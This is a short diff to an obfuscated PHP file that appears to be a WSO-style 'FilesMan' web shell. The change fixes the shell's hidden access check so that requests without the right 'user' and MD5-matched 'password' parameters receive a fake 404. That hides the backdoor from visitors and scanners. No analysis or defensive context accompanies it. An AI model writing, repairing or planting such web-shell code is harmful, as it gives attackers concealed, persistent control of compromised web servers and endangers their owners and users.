@@ -5,7 +5,7 @@ $▘ = true;
 $▜ = 'UTF-8';
 $▚ = 'FilesMan';
 
-if(!array_key_exists('user',$_GET['user']) || !array_key_exists('user',$_GET['password']) || (array_key_exists('user',$_GET['password']) && md5($_GET['password']) != $▛)){
+if(!array_key_exists('user',$_GET) || !array_key_exists('password',$_GET) || (array_key_exists('password',$_GET) && md5($_GET['password']) != $▛)){
 	http_response_code(404);
   exit();
 }
